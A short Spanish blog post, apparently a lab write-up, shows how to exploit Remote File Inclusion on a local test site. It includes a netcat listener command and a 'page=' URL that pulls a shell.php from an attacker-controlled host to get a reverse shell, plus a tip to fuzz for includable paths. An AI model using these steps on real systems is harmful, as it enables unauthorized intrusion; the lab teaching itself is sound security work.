---
title: Vulnerabilidad Remote File Inclusion
excerpt: Explotación Remote File Inclusion
publishDate: 'Oct 08 2025'
tags:
  - remote file inclusion
seo:
  image:
    src: '/rfi.png'
    alt: Imagen creada con Chat GPT
---

![rfi](/rfi.png)

***Resumen***: Esta vulenrabilidad, nos permite llevar nuestra URL a otro servidor donde tengamos alojado una web maliciosa o un payload que nos llevará a la intrusión de la máquina.

***Nota***: Para este laboratorio he usado chatGPT para crear el entorno vulnerable.

## Procedimiento

Una vez desplegado el laboratorio, accedemos a él y vemos la url vulnerable con el parámetro **page=** que nos dice ya donde introducir la dirección de nuestro payload.

[![url_vulnerable](/url_rfi.png)](/url_rfi.png)

```bash
http://localhost:8080/?page=local.php
```

En la máquina atacante abrimos un servidor http en python para servir el payload.

[![servidor_http](/server_http.png)](/server_http.png)

También ponemos nc a escuchar por el puerto que tengamos configurado en el payload para recibir la shell remota.

```bash
 sudo nc -lvnp 4444 
 ```

 Ahora solo tenemos que poner en la url vulnerable la dirección de nuestro payload y recibiremos la conexión.

 ```bash
 http://localhost:8080/?page=http://192.168.1.42:4444/shell.php
 ```
 [![reverse_shell](/rvs.png)](/rvs.png)

 ## Conclusión

 La vulnerabilidad es muy fácil de explotar y está presente en más sitios de los que a priori podamos pensar. Es muy parecido a un LFI, pero con pequeños cambios.

 ***Consejos extra***: Si no encontramos un parámetro en la URL que nos permita hacer el RFI, hacemos fuzzing web para buscar una ruta que sí lo permita.




